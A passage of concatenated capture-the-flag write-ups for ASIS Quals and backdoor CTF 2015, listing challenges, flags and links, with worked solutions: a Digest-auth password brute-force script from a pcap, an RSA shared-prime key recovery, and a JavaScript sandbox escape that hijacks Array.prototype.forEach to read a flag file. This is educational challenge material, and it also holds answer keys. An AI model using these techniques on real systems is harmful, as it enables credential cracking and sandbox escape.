Note that you have to create a flag file named `freedom` with `echo "ASIS{109096cca8948d1cebee782a11d2472b}" > freedom'` to test it locally.

The flag is `ASIS{109096cca8948d1cebee782a11d2472b}`.

PS: Instead of using `ctypes`, some writeups, such as [this one](http://blog.tinduong.pw/asis-quals-2015-saw-this-writeup/) implemented the seeding and algorithm in C. [Another writeup author](http://fritzfs.blogspot.de/2015/05/writeup-saw-this-1-asis-ctf-quals-2015.html) even wrote a gdb script that emulates the algorithm!
## Other write-ups and resources

* <http://fritzfs.blogspot.com/2015/05/writeup-saw-this-1-asis-ctf-quals-2015.html>
* <https://www.whitehatters.academy/asis-ctf-quals-2015-saw-this-1/>
* <http://blog.tinduong.pw/asis-quals-2015-saw-this-writeup/>
* <https://ucs.fbi.h-da.de/writeup-asis-ctf-quals-2015-saw-this-1/>
* <http://bruce30262.logdown.com/posts/277024-asis-ctf-2015-quals-saw-this-1>
* [Indonesian](https://github.com/rentjongteam/write-ups-2015/tree/master/asis-quals-2015/saw-this-1)
* [Japanese](http://www.cnhackmy.com/hacked/CTF/2015/09/12/00001679.html)
* [Polish](http://forum.4programmers.net/Spolecznosc/252274-writeup_asis_ctf_2015)
# ASIS Quals CTF 2015: Saw this -2

**Category:** pwn
**Points:** 400
**Solves:** 23
**Description:**

> Survive and get the flag!
> Note: This [challenge](http://tasks.asis-ctf.ir/sawthis_cdc323fa79278bcd63e91156dd83e91c) contains two flags, one of them is easier to
> fetch, the other is harder. The easier flag will be clearly indicated
> as "Flag 1", the harder flag as "Flag 2". Submit the harder (Flag 2)
> here.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.tinduong.pw/asis-quals-2015-saw-this-writeup/> (Down?)
* <http://bruce30262.logdown.com/posts/277024-asis-ctf-2015-quals-saw-this-1>
* [Japanese](http://www.cnhackmy.com/hacked/CTF/2015/09/12/00001679.html)
* [Polish](http://forum.4programmers.net/Spolecznosc/252274-writeup_asis_ctf_2015)
# ASIS Quals CTF 2015: Shellc0d3

**Category:** pwn
**Points:** 300
**Solves:** 6
**Description:**

> Yet another online [shellc0de](http://tasks.asis-ctf.ir/shellc0de_ff741fa7416cdf79a9f5615852e9ccef) executor. Use your own to break the walls.
> 
> nc 217.218.48.87 33011

## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/n9WMGtB0>
# ASIS Quals CTF 2015 write-ups

* <http://www.asis-ctf.ir/>
* [Scoreboard](http://www.asis-ctf.ir/scoreboard/) or [local alternative](scoreboard)

## Completed write-ups

* [crypto/angler](crypto/angler)
* [crypto/falsecrypt](crypto/falsecrypt)
* [crypto/golden-metal](crypto/golden-metal)
* [crypto/simple-algorithm](crypto/simple-algorithm)
* [forensic/broken-heart](forensic/broken-heart)
* [forensic/keka-bomb](forensic/keka-bomb)
* [forensic/my-ped](forensic/my-ped)
* [forensic/zrypt](forensic/zrypt)
* [pwn/saw-this-1](pwn/saw-this-1)
* [stego/blind](stego/blind)
* [stego/number-pi](stego/number-pi)
* [trivia/survey](trivia/survey)
* [web/strange-authen](web/strange-authen)

## External write-ups only

* [crypto/cross-check](crypto/cross-check)
* [forensic/dump](forensic/dump)
* [programming/grids](programming/grids)
* [pwn/math-sequence](pwn/math-sequence)
* [pwn/saw-this-2](pwn/saw-this-2)
* [pwn/shellc0d3](pwn/shellc0d3)
* [reverse/dark](reverse/dark)
* [reverse/keylead](reverse/keylead)
* [reverse/leach](reverse/leach)
* [reverse/selfie](reverse/selfie)
* [reverse/tera](reverse/tera)
* [trivia/whats-example-flag](trivia/whats-example-flag)
* [web/best-photo](web/best-photo)
* [web/secret-message](web/secret-message)

## Missing write-ups

* [crypto/qrypt](crypto/qrypt)
* [forensic/checkme](forensic/checkme)
* [forensic/must-see-iran](forensic/must-see-iran)
* [pwn/auth-ng](pwn/auth-ng)
* [reverse/asis-card](reverse/asis-card)
* [trivia/bonus-point](trivia/bonus-point)
* [trivia/launch-printer](trivia/launch-printer)# ASIS Quals CTF 2015: ASIS Card

**Category:** Reverse
**Points:** 350
**Solves:** 6
**Description:**

> hey, we've got a problem here, there's a secret data in some smart card but we couldn't access to it. It's so important to us. data.bin is the dumped card's data. also we have a binary file scardprovider which we took in some way(believe me you don't want to know how). It seems to be the main part but we couldn't run it. Could you please take a look at [these](http://tasks.asis-ctf.ir/ASIS_Card_432a726a8ab38d704befb777b7bfe346)?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Quals CTF 2015: Dark

**Category:** pwn
**Points:** 125
**Solves:** 39
**Description:**

> Find the flag in this [file](http://tasks.asis-ctf.ir/dark_aba92f5882a156452b18b895c722cea6).

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/ASISCTF/reversing/dark>
* <https://twitter.com/m_ad3l/status/597878193069096961>
* <http://boaster.github.io/ctf/2015/05/11/ASIS-CTF-Dark.html>
* <http://nnguwriteups.blogspot.ru/2015/05/asis-2015-quals-dark-reversing-125.html>
* <https://ctftime.org/writeup/1465>
# ASIS Quals CTF 2015: KeyLead

**Category:** Reverse
**Points:** 150
**Solves:** 121
**Description:**

> Find the flag in this [file](http://tasks.asis-ctf.ir/keylead_068128f7cacc63375c9cbab8114e15da).

## Write-up

(TODO)

## Other write-ups and resources

* <http://dakutenpura.hatenablog.com/entry/2015/05/11/235011>
* [b01lers](https://b01lers.net/challenges/ASIS%202015/KeyLead/51/)
* <https://neg9.org/news/2015/5/11/asis-ctf-quals-2015-keylead-reversing-150-writeup>
* <http://www.thice.nl/asis-ctf-2015-write-ups/>
# ASIS Quals CTF 2015: Leach

**Category:** Reverse
**Points:** 250
**Solves:** 58
**Description:**

> Find the flag in this [file](http://tasks.asis-ctf.ir/leach_bc83626319ab77ade5408f6ea222920e).

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/ASISCTF/reversing/leach>
* <https://www.whitehatters.academy/asis-ctf-leach/>
* <http://boaster.github.io/ctf/2015/05/11/ASIS-CTF-Leach.html>
* <https://neg9.org/news/2015/5/11/asis-ctf-quals-2015-leach-reversing-250-writeup>
* [Indonesian](https://github.com/rentjongteam/write-ups-2015/tree/master/asis-quals-2015/leach)
# ASIS Quals CTF 2015: Selfie

**Category:** Reverse
**Points:** 150
**Solves:** 57
**Description:**

> Find the flag in this [file](http://tasks.asis-ctf.ir/selfie_5867d7cda31739aa81dec7b4355b2fab).

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/ASISCTF/reversing/selfie>
# ASIS Quals CTF 2015: Tera

**Category:** Reverse
**Points:** 100
**Solves:** 58
**Description:**

> Be patient and find the flag in this [file](http://tasks.asis-ctf.ir/tera_85021482a68d6ed21892ea99b84f13f3).

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/ASISCTF/reversing/tera>
* <http://boaster.github.io/reverse%20engineering,%20ctf/2015/05/11/ASIS-CTF-Tera.html>
* <http://blog.morganz.me/blog/2015/05/12/asis-ctf-quals-2015-re100-tera-writeup/>
* [Indonesian](https://github.com/rentjongteam/write-ups-2015/tree/master/asis-quals-2015/tera)
# ASIS Quals CTF 2015: Blind

**Category:** Stego
**Points:** 225
**Solves:** 2
**Description:**

> Download the [file](http://tasks.asis-ctf.ir/blind_40252205e1bb2c138442a10bd776417d) and find the flag.

## Write-up

by [polym](https://github.com/abpolym)

This write-up is based on a writeup by [khack40](http://khack40.info/asis-quals-ctf-2015-blind-write-up/).

Using `file`, we see that we are given a xz-compressed file and uncompress it using `unxz`:

```bash
+bash-4.3$ file blind_40252205e1bb2c138442a10bd776417d 
blind_40252205e1bb2c138442a10bd776417d: xz compressed data
+bash-4.3$ mv blind_40252205e1bb2c138442a10bd776417d{,.xz}
+bash-4.3$ unxz blind_40252205e1bb2c138442a10bd776417d.xz
+bash-4.3$ file blind_40252205e1bb2c138442a10bd776417d 
blind_40252205e1bb2c138442a10bd776417d: PNG image data, 800 x 600, 8-bit/color RGBA, non-interlaced
```

Using `stegsolve`, we first see an airplane at the `Alpha plane 0` values:

![](./airplane.png)

Adding to that, we see an anomaly at the `Blue plane 0` values:

![](./blue.png)

The airplane looks like a red herring, however the blue values seem to be interesting.

Let's print all blue values by row using [pixels.py](./pixels.py):

```bash
+bash-4.3$ python2.7 pixels.py blind_40252205e1bb2c138442a10bd776417d
242 242 242 [...] 244 244 248
249 243 240 [...] 244 244 248
249 243 243 [...] 242 242 248
```

We can see that each row, except the first one, begins with `249` and ends with `248`.

The author encoded a [brainloller](https://esolangs.org/wiki/Brainloller) program into the blue values.

Here, a blue value `240` represents a brainloller pixel with RGB values `(255,0,0)`, which is `>` in a brainfuck program.
`241` represents a pixel with RGB values `(128,0,0)`, which is the braincode instruction `>` etc.

We can translate the pixels into a brainfuck program using [brainloller.py](./brainlollerpy). Note that this program assumes that at the end of each row, a brainloller's program changes its IP direction (cyan and darkcyan values).

The output of the python script is a brainfuck program, [blind.bf](blind.bf).

We interpret this brainfuck code using `bf` and get a base64 [encoded string](./answer.64) as output.

The output is a PNG containing our flag:

![](flag.png)

## Other write-ups and resources

* <http://khack40.info/asis-quals-ctf-2015-blind-write-up/>
# ASIS Quals CTF 2015: Number π

**Category:** Stego
**Points:** 200
**Solves:** 2
**Description:**

> Find the flag in this [file](http://tasks.asis-ctf.ir/PI_number_633904b78afdee334b7020dccefbfe39).

## Write-up

by [polym](https://github.com/abpolym)

We extract the file using `unxz` and get a PNG according to `file`.

The PNG shows us a filesystem, the PI symbol and a binary string:

	1101010000000101000101000000010000100100000001010001010000000101001111000000000001110100000000000110010000000000001111000000001111000100000000110001100000000100011101000000000000101100000001101001010000010101000111000000000001110100000001001001000000000010101111000000111010111100000011101011110000001111110001000000000001110100000001101011110000001100011101000000010101011100000001101001010000010101110000000000100101011100000001110110010000000001010111000000011111000100000000101011110000001100001011000000000100011100000000001001000000000010101111000000110001110100000000010101110000000110000000000000110110000100000000

First, we try to decode this string using a binary to ascii converter, but this process is fruitless.

The PNG tells us to search for the keywords `filesystem` and `PI`, which leads us to a filesystem `πfs` that stores data in π, which is [open source](https://github.com/philipl/pifs).

We clone the repository, have to install some libraries with  `sudo apt-get install autogen fuse libfuse2 libfuse-dev` and install the filesystem using `./autogen.sh && ./configure && ./make && sudo ./make install`.

After that, we mount a source directory `/tmp/src` to `/tmp/mnt` using `πfs -o mdd=/tmp/src /tmp/mnt`.

Now, we can copy any file into the src directory and we will receive an ''unπ-ed'' file.

We have to prepend the binary string with two zeroes and save it as a binary file. We can do that using

```bash
echo "00$(echo '<string>' | perl -lpe '$_=pack\"B*\",$_')" > /tmp/src/flagbin
```

Now we just have to look at the content of `/tmp/mnt/flagbin`:

	$ cat /tmp/mnt/flagbin
	ASIS{4716b435ce8ddd6ede25a2926d0c8d42}

## Other write-ups and resources

* <http://khack40.info/asis-quals-ctf-2015-number-pistega-write-up/>
# ASIS Quals CTF 2015: Bonus Point

**Category:** Trivia
**Points:** 99
**Solves:** 6
**Description:**

> There will be bonus points for the teams that submit most interesting ASIS CTF related stuff including CTF tools, codes, any bugs from scoreboard or tasks (if you have :D) and so on.
> 
> You can send them to quals2015@asis-ctf.ir and make sure to change the subject to “Bonus Point”
> 
> Maximum 3 stuff
> 
> Make sure you include your team name in the email.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Quals CTF 2015: Launch Printer

**Category:** Trivia
**Points:** 25
**Solves:** 5
**Description:**

> How did I call the printer from command line?
> 
> Attention
> 
> After finding the flag, compute md5 hash and submit it like example flag.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Quals CTF 2015: Survey

**Category:** Trivia
**Points:** 100
**Solves:** 49
**Description:**

> [Here](http://goo.gl/forms/VhU93ZW1Ul) is a piece of a cake challenge for those who love us ;)

## Write-up

> Thanks for Participating! Here is your Flag: ASIS{5d9aeafefbe97ce807f8a817d855d418}

## Other write-ups and resources

* none yet
# ASIS Quals CTF 2015: What's example flag?

**Category:** Trivia
**Points:** 1
**Solves:** 401
**Description:**

> Find the example flag

## Write-up

(TODO)

## Other write-ups and resources

* [Indonesian](https://github.com/rentjongteam/write-ups-2015/tree/master/asis-quals-2015/whats-example-flag)
# ASIS Quals CTF 2015: Best Photo

**Category:** Web
**Points:** 175
**Solves:** 50
**Description:**

> Go [there](http://bestphoto.asis-ctf.ir/) and find the flag.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-asis-ctf-quals-2015-best-photo/>
* <http://www.thice.nl/asis-ctf-2015-write-ups/>
* [Indonesian](https://github.com/rentjongteam/write-ups-2015/tree/master/asis-quals-2015/best-photo)
# ASIS Quals CTF 2015: Secret Message

**Category:** Web
**Points:** 150
**Solves:** 6
**Description:**

> Go [there](http://secretmessage.asis-ctf.ir/) and find the flag.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-asis-ctf-quals-2015-secret-message/>
# ASIS Quals CTF 2015: Strange Authen

**Category:** Web
**Points:** 225
**Solves:** 12
**Description:**

> Go [there](http://strangeauthen.asis-ctf.ir/) and find the flag.

## Write-up

by [Ghaaf](https://github.com/Ghaaf)

After spend sometimes to find some vulnerabilities with no luck I check robots.txt, there was an important path there and it was misc folder contains pcap file. So take a look at pcap and filter with ‘http && ip.dst == 217.218.48.85’ and get some interesting packets:

	GET /login.php HTTP/1.1
	Host: strangeauthen.asis-ctf.ir
	Connection: keep-alive
	Authorization: Digest username="admin", realm="this page for admin only, go out", nonce="5549f5f40edf1", uri="/login.php", response="d9ace07007cb801fa28a3bba92ddd515", opaque="e7c2664182934b3197e2e8dc48dbcf41", qop=auth, nc=00000393, cnonce="e7c3a4eefacfefbb"
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
	DNT: 1
	Referer: http://strangeauthen.asis-ctf.ir/
	Accept-Encoding: gzip, deflate, sdch
	Accept-Language: en-US,en;q=0.8,fa;q=0.6,de;q=0.4
	Cookie: PHPSESSID=hkgvkkaoq60v2bv613r2uouq22
	
	GET /login.php HTTP/1.1
	Host: strangeauthen.asis-ctf.ir
	Connection: keep-alive
	Authorization: Digest username="factoreal", realm="this page for admin only, go out now!", nonce="554aed8c0b2d8", uri="/login.php", response="d9b58c347f96195884ce27036f3c9546", opaque="d073cc4342291e6270746b4675498022", qop=auth, nc=00000001, cnonce="d6d1a0a39a93b4c3"
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
	DNT: 1
	Referer: http://strangeauthen.asis-ctf.ir/index.html
	Accept-Encoding: gzip, deflate, sdch
	Accept-Language: en-US,en;q=0.8,fa;q=0.6,de;q=0.4
	Cookie: PHPSESSID=hkgvkkaoq60v2bv613r2uouq22
	
	GET /7he_most_super_s3cr3t_page.php HTTP/1.1
	Host: strangeauthen.asis-ctf.ir
	Connection: keep-alive
	Authorization: Digest username="factoreal", realm="this page for admin only, go out now!", nonce="554aed8c0b2d8", uri="/7he_most_super_s3cr3t_page.php", response="587bb0cf4968b88fdf00c8ae81ff8bf4", opaque="d073cc4342291e6270746b4675498022", qop=auth, nc=00000002, cnonce="bd65e746ecf4d7e7"
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
	DNT: 1
	Referer: http://strangeauthen.asis-ctf.ir/login.php
	Accept-Encoding: gzip, deflate, sdch
	Accept-Language: en-US,en;q=0.8,fa;q=0.6,de;q=0.4
	Cookie: PHPSESSID=hkgvkkaoq60v2bv613r2uouq22

At first I try to login by changing Authorization with Tamper data, the first one doesn’t work the second one, BOOM…
I logged in as factorial so let see most secret page… It needs to login! Lets try the 3rd one, no luck…
So what’s the point, it’s digest access authentication so maybe I should bruteforce the password, lets ask google and the first result was Wikipedia ‘Digest access authentication’.
The example points to 3 important things:

	1. The MD5 hash of the combined username, authentication realm and password is calculated. The result is referred to as HA1.
	2. The MD5 hash of the combined method and digest URI is calculated, e.g. of "GET" and "/dir/index.html". The result is referred to as HA2.
	3. The MD5 hash of the combined HA1 result, server nonce (nonce), request counter (nc), client nonce (cnonce), quality of protection code (qop) and HA2 result is calculated. The result is the "response" value provided by the client.

We have everything except password:

	username="factoreal"
	realm="this page for admin only, go out now!"
	nonce="554aed8c0b2d8"
	uri="/login.php"
	response="d9b58c347f96195884ce27036f3c9546"
	qop=auth
	nc=00000001
	cnonce="d6d1a0a39a93b4c3"

I ask about password type and admin points to the top password lists, so I write my script to bruteforce and I just need to password list that contains our goal:

	import hashlib
	
	password = open('passwords.txt').read().splitlines()
	h2 = hashlib.md5("GET:/login.php").hexdigest()
	for i in range(len(password)):
		h1 = hashlib.md5("factoreal:this page for admin only, go out now!:" + password[i]).hexdigest()
		result = hashlib.md5(h1 + ":554aed8c0b2d8:00000001:d6d1a0a39a93b4c3:auth:" + h2).hexdigest()
		if result == "d9b58c347f96195884ce27036f3c9546":
			print "[*] Password found: " + password[i]
			exit()

I try some password list and it was really hard to find the best one, but finally it works and I find the password:

	[*] Password found: secpass

So let’s login again. It works, but stuck on visiting top secret page…  I try to sync admin content with my own, PHPSESSID and UserAgent, another try and it doesn’t work! I ask admin and he tells that I’m in right way, but why it doesn’t work! He points to change cookie date and I do it, change that to 2016 and try again, let’s check the page:

	Welcome factoreal, nice to see you again!
	Congratz! Great you found me!

And here is the Flag:

	ASIS{004efe5ec5867811f4f13bc8f9921517}

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-asis-ctf-quals-2015-strange-authen/>
# backdoor CTF 2015: [ECHO](https://backdoor.sdslabs.co/challenges/ECHO)

**Category:** Binary
**Points:** 100
**Author:** [Dhaval Kapil](https://backdoor.sdslabs.co/users/vampire)
**Difficulty:** Medium
**Solves:** 113
**Description:** 

* <https://backdoor.sdslabs.co/challenges/ECHO>

> Little Suzie started learning C. She created a simple program that echo's back whatever you input. [Here](http://hack.bckdr.in/ECHO/echo) is the binary file. The vampire came across this service on the internet. nc hack.bckdr.in 8002. Reports say he found a flag. See if you can get it.

## Write-up

(TODO)

## Other write-ups and resources

* <https://shankaraman.wordpress.com/2015/04/02/backdoor-ctf-2015-echo-writeup/>
* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup/>
* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-echo/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BACKDOORCTF/pwnable/echo>
* <https://gist.github.com/Bono-iPad/e908ddc67b3994069950>
* [Indonesian](https://docs.google.com/document/d/1kaoFGEtSO2X7SJYs7JRsHJXVXyuJ1SheRl-qcPCmo3s/edit)
# backdoor CTF 2015: [TEAM](https://backdoor.sdslabs.co/challenges/TEAM)

**Category:** Binary
**Points:** 600
**Author:** [Dhaval Kapil](https://backdoor.sdslabs.co/users/vampire)
**Difficulty:** Hard
**Solves:** 91
**Description:** 

* <https://backdoor.sdslabs.co/challenges/TEAM>

> There is a wierd kind of authentication service running: `nc hack.bckdr.in 8004`. The binary can be found [here](http://hack.bckdr.in/TEAM/team). The vampire says that there is no need for bruteforce.

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/MarvelousBreadchris/903ab79dbe94249e7322>
* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup/>
* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-team/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BACKDOORCTF/pwnable/team>
* <https://gist.github.com/Bono-iPad/e908ddc67b3994069950>
* [Indonesian](https://docs.google.com/document/d/1427fpB7LJLpzS1-QDAmTRMP-VvSmHASPDmUmvndYlmU/edit)
# backdoor CTF 2015: [BBAD](https://backdoor.sdslabs.co/challenges/BBAD)

**Category:** Crypto
**Points:** 200
**Author:** [Vishrut Kumar Mishra](https://backdoor.sdslabs.co/users/VishrutKumarMishra)
**Difficulty:** Medium
**Solves:** 13
**Description:** 

* <https://backdoor.sdslabs.co/challenges/BBAD>

> NSA has started using a new cryptography algorithm developed by Bat Maze of University of Transylvania. Nemo Labs is planning to exploit this. The organization has managed to get their hands on some files from a disposed computer which might contain some sensitive information, and from communication intercepted earlier they've heard that the key is supposed to be less than 12000. The files are [crypted message](http://hack.bckdr.in/BBAD/crypted_text.txt), [test code soure](http://hack.bckdr.in/BBAD/test_coede_spurce.txt), [bash history](http://hack.bckdr.in/BBAD/bash_history.txt), [output](http://hack.bckdr.in/BBAD/output.txt).

## Write-up

(TODO)

## Other write-ups and resources

* <http://web2.mrexcessive.net/index.php/2015/04/bbad-crypto-challenge-backdoor-ctf-2015># backdoor CTF 2015: [RAND](https://backdoor.sdslabs.co/challenges/RAND)

**Category:** Crypto
**Points:** 250
**Author:** [Abhay Bir Singh Rana](https://backdoor.sdslabs.co/users/nemo)
**Difficulty:** TODO
**Solves:** 3
**Description:** 

* <https://backdoor.sdslabs.co/challenges/RAND>

> The flag is hidden in the middle of [this](http://hack.bckdr.in/RAND/) generated garbage. Make sure you open it in your browser.

## Write-up

by Richard Baranyi

We are given a link to a website http://hack.bckdr.in/RAND/ which seems to display some random data and a hint to access the webpage using a browser (this is important, because page uses cookies)

If we do enough requests to the webpage and store all the responses and then plot all the possible 4-bit values that occur on all the positions we get this nice looking graph
![data](data.png)

We can see that every possible value (0 - 15) is present everywhere except around middle of the stream. If we zoom in to this region we can see this
![data_zoomed](data_zoomed.png)

The region has exactly the same length as SHA256 digest so that's a good hint that we are on the right track. The problem now is how the data are encoded in this. The trick is to count how many possible values each offset have and convert that to 4-bit value. If we do this for every offset in in range 999-1064 we get the flag.

## Other write-ups and resources

* none yet# backdoor CTF 2015: [RSALOT](https://backdoor.sdslabs.co/challenges/RSALOT)

**Category:** Crypto
**Points:** 250
**Author:** [Abhishek Das](https://backdoor.sdslabs.co/users/abhshkdz)
**Difficulty:** TODO
**Solves:** 31
**Description:** 

* <https://backdoor.sdslabs.co/challenges/RSALOT>

> The flag is encrypted using a system that makes use of prime factorization of large numbers. Decrypt the flag from [this](http://hack.bckdr.in/RSALOT/RSALOT.tar.gz).

## Write-up

by [polym](https://github.com/abpolym)

We are given 100 public keys with the names `1.pem`-`100.pem`, as well as a `flag.enc` that contains our base64 encoded ciphertext.

After understanding what RSA does, e.g. with [this nice quick overview](http://doctrina.org/How-RSA-Works-With-Examples.html) containing all basic mathematical concepts needed to understand RSA as well as an explaination of RSA by example.

We need to understand following:

* A public key is composed of the pair `(n,e)` - the modulus `n` and the public exponent `e`
* A private key is composed of the pair `(n,d)` -  the modulus `n` and the private exponent `d`
* Decrypting a ciphertext is taking the integer value of a ciphertext to the private exponent and applying modulo `n` to it - `c^d mod n = m`
* Encrypting a message is taking the integer value of a message to the public exponent and applying modulo `n` to it - `m^e mod n = c`
* A modulus `n` is composed of a multiplication of two (large) prime numbers `p` and `q`
* This multiplication is a trapdoor - easy in one way (multiplication), difficult in the other (factoring)
* The totien `phi(n)` can be calculated as follows: `phi(n) = phi(p*q) = (p-1)*(q-1)`
* The public exponent `e` is chosen in the range `[3,phi(n)[`, often `65537` as it is in this case
* The private exponent `d` is calculated using the `phi(n)` modular multiplicative inverse of `e` so that `e*d = 1 mod phi(n)`
* Private components are therefore `p`, `q`, `d` and `phi(n)`
* Public components are therefore `e` and `n`
* [OAEP](http://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding) Padding is used to avoid several attacks against RSA

Using `openssl rsa -pubin -inform PEM -noout -text -modulus < x.pem` for each public key, we see that the same public exponent `e=65537` has been used and different moduli have been created.

Our guess of an attack given many public keys is that some private components are reused in the computation of a public key, i.e. `p`, `q` or `d`.

E.g. we have two moduli `na=p_1*q_1` and `nb=p_1*q_2`, we can find the greatest common divisor of both numbers, which is `p_1`. If there is no such common divisor, we get as result `1`, since the primes of both moduli are not part of the other.

After finding such a `gcd(na,nb)!=1`, we divide `nb` by `p_1` to get `q_2`: `nb/p_1 = (p_1*q_2)/p_1 = q_2` and can calculate `d` using the modular multiplicative inverse of with the help of the extended euclidian algorithm.

Finally, we get the decimal representation of the base64 decoded ciphertext and apply the decryption function on the ciphertext `c` using the private exponent `d` and the modulus `n` as previously mentioned.

[This script](rsasolve.py) does exactly that. The public keys, which moduli do have common primes, are `64.pem` and `87.pem`. `flag.enc.2` is the base64 decoded hexadecimal representation of `flag.enc`, which can be created using this command `cat flag.enc | base64 --decode | xxd -p | tr -d '\n'`.

To generate the private key `private.pem` with the knowledge of `p` and `q`, we use [rsatool.py](https://github.com/ius/rsatool):

```
python rsatool.py -p 168736462866079204789584058199620418225526506348478399447895958829038354002285480486576728303147995561507709511105490546002439968559726489519296139857978907240880718150991015966920369123795034196767754935707681686046233424449917085120027639055362329862072939086970892956139024391556483288415208981014264336691 -q 139208418683860744636489594107518498051692876942105482068436575406002091300025595750940476658875774324613311765708231971440632450100860632595797604226237831396754383891914573698131769762436941837224713009721577421233571830899874638297795728204831707647487557389464078420524002550428515370686466308350190419191 -o private.pem
```

However, we have to add OAEP padding to reimplement a correct encryption/decryption function. This time, searching the [2014 writeup repo](https://github.com/ctfs/write-ups-2014/tree/master/asis-ctf-finals-2014/rsa-in-real-world) for the needed code gives us a [decrypt function](decrypt.py):

```bash
$ python decrypt.py 
the_flag_is_b7[...]
```



## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BACKDOORCTF/crypto/rsalot>
* <https://gist.github.com/Bono-iPad/e908ddc67b3994069950># backdoor CTF 2015: [RSANNE](https://backdoor.sdslabs.co/challenges/RSANNE)

**Category:** Crypto
**Points:** 350
**Author:** [Abhishek Das](https://backdoor.sdslabs.co/users/abhshkdz)
**Difficulty:** TODO
**Solves:** 25
**Description:** 

* <https://backdoor.sdslabs.co/challenges/RSANNE>

> The flag is encrypted using a system that makes use of prime factorization of large numbers. Decrypt the flag from [this](http://hack.bckdr.in/RSANNE.tar.gz). If you pwned RSALOT, you should have a fun time solving this one.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BACKDOORCTF/crypto/rsanne>
* <https://gist.github.com/Bono-iPad/e908ddc67b3994069950>
* <http://www.sinfocol.org/2015/04/backdoor-ctf-2015-rsanne/># backdoor CTF 2015: [CLOSED](https://backdoor.sdslabs.co/challenges/CLOSED)

**Category:** Exploit
**Points:** 300
**Author:** Amanpreet Singh
**Difficulty:** TODO
**Solves:** 13
**Description:**

* <https://backdoor.sdslabs.co/challenges/CLOSED>

> All paths have been closed. Get the flag: `nc 128.199.107.60 8000`. Submit sha256 of flag obtained.

## Write-up

by [mathiasbynens](https://github.com/mathiasbynens)

[Read the write-up for the _Concealed_ challenge first.](https://github.com/ctfs/write-ups-2015/tree/master/backdoor-ctf-2015/exploit/concealed) This challenge is similar.

Let’s connect to the service:

```bash
$ nc 128.199.107.60 8000
######################################
####           CLOSED             ####
######################################

Welcome to CLOSED Jail
You have access to object named sandboxed and its functions
Rest everything is sandboxed, don’t be a jerk and break something
Wrap your code in a function and return what you want as output
Flag is in flag.txt file in same directory.
Get the flag :D!

home@jail:$
```

The welcome message reveals that the flag is hidden in `flag.txt`. Some initial testing reveals it’s a JavaScript sandbox:

```
home@jail:$ sandboxed
TypeError: Property 'sandboxed' of object #<Object> is not a function

home@jail:$ function() { return sandboxed; }
[object Object]

home@jail:$ function() { return Object.keys(sandboxed); }
readFlag,print

home@jail:$ sandboxed.readFlag
Oh shit! I am reading the wrong file.

home@jail:$ function() { return sandboxed.readFlag; }
function () {
  var text = '';
  flagfiles.forEach(function (file) {
    text += fs.readFileSync(file);
  });

  return text;
}

home@jail:$ sandboxed.print
undefined

undefined

home@jail:$ function() { return sandboxed.print; }
function (data) {
  sys.print(data + '\n' + '\n');
}
```

Unfortunately, the sandbox runs in strict mode, which means we can’t reuse the trick we used to solve [_Concealed_](https://github.com/ctfs/write-ups-2015/tree/master/backdoor-ctf-2015/exploit/concealed) to reveal the rest of the source code:

```
home@jail:$ function() { return String(arguments.callee.caller); }
TypeError: 'caller', 'callee', and 'arguments' properties may not be accessed on strict mode functions or the arguments objects for calls to them
```

It seems the challenge must be solved some other way. Let’s take a closer look at the `readFlag` function:

```
home@jail:$ function() { return sandboxed.readFlag; }
function () {
  var text = '';
  flagfiles.forEach(function (file) {
    text += fs.readFileSync(file);
  });

  return text;
}
```

We can’t control the value of the `flagfiles` variable, but if we could, the challenge could be solved by doing something like `flagfiles = ['flag.txt']`. However, we can overwrite `Array.prototype.forEach` as follows:

```js
Array.prototype.forEach = function(callback, array) {
  return callback.call(array, 'flag.txt');
};
```

Now, when `sandboxed.readFlag` gets called, it will return the contents of `flag.txt`:

```
home@jail:$ function() { Array.prototype.forEach = function(callback, array) { return callback.call(array, 'flag.txt'); }; return sandboxed.readFlag(); }
flag: [redacted]
```

Now that we have the flag, all that’s left to do is to hash it using SHA-256 so it can be submitted:

```bash
$ printf "$flag" | sha256sum
```

## Other write-ups and resources

* none yet
# backdoor CTF 2015: [CONCEALED](https://backdoor.sdslabs.co/challenges/CONCEALED)

**Category:** Exploit
